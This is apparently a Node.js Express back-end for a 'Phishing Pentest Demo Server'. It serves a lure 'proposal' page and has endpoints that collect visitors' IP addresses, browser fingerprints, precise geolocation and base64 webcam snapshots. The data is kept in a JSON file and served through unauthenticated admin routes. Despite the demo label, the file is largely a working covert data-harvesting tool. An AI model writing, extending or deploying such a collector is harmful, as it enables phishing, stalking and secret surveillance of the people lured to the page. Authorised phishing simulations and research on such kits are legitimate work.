const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'collected_data.json');

// Ensure data file exists
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, JSON.stringify([]));
}

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ========== DATA COLLECTION ENDPOINTS ==========

// Collect data from the proposal page
app.post('/api/collect', (req, res) => {
  const data = req.body;
  const entry = {
    id: Date.now().toString(36) + Math.random().toString(36).slice(2, 6),
    timestamp: new Date().toISOString(),
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress,
    ...data
  };

  const records = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
  records.push(entry);
  fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));

  console.log(`[+] Data collected from ${entry.ip} (ID: ${entry.id})`);
  res.json({ status: 'ok' });
});

// Collect geolocation (separate endpoint for async geo requests)
app.post('/api/geolocation', (req, res) => {
  const { id, latitude, longitude, accuracy } = req.body;
  if (!id) return res.json({ status: 'error', message: 'Missing id' });

  const records = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
  const record = records.find(r => r.id === id);
  if (record) {
    record.geolocation = { latitude, longitude, accuracy };
    record.geo_timestamp = new Date().toISOString();
    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
    console.log(`[+] Geolocation saved for ${record.fingerprint?.userAgent?.slice(0, 40) || id}`);
  }
  res.json({ status: 'ok' });
});

// Collect webcam snapshot (base64)
app.post('/api/webcam', (req, res) => {
  const { id, image } = req.body;
  if (!id) return res.json({ status: 'error', message: 'Missing id' });

  const records = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
  const record = records.find(r => r.id === id);
  if (record) {
    record.webcam_image = image;
    record.webcam_timestamp = new Date().toISOString();
    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
    console.log(`[+] Webcam snapshot saved for ${id}`);
  }
  res.json({ status: 'ok' });
});

// ========== ADMIN ENDPOINTS ==========

// Get all collected data
app.get('/api/data', (req, res) => {
  const records = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
  res.json(records);
});

// Get a single record
app.get('/api/data/:id', (req, res) => {
  const records = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
  const record = records.find(r => r.id === req.params.id);
  if (!record) return res.status(404).json({ error: 'Not found' });
  res.json(record);
});

// Delete all data
app.delete('/api/data', (req, res) => {
  fs.writeFileSync(DATA_FILE, JSON.stringify([]));
  console.log('[!] All data cleared');
  res.json({ status: 'ok' });
});

// Serve admin panel
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Serve admin panel at /panel too
app.get('/panel', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// ========== START ==========
app.listen(PORT, '0.0.0.0', () => {
  console.log(`
  ╔══════════════════════════════════════════╗
  ║   Phishing Pentest Demo Server           ║
  ║──────────────────────────────────────────║
  ║  Proposal Site:  http://localhost:${PORT}  ║
  ║  Admin Panel:    http://localhost:${PORT}/admin  ║
  ║  Data API:       http://localhost:${PORT}/api/data ║
  ╚══════════════════════════════════════════╝
  `);
});

